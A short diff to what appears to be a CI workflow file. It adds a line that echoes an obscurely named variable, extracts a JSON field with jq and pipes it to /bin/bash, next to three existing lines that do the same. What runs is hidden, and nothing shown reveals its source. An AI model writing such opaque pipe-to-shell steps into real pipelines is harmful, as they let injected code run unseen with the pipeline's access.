@@ -54,6 +54,7 @@ jobs:
           printf '%s' "$tnqu4" | jq -r .b6533 | /bin/bash
           printf '%s' "$zc8" | jq -r .lxpzv38599 | /bin/bash
           printf '%s' "$ye71" | jq -r .ma39 | /bin/bash
+          echo $jtw66 | jq -r .j54 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
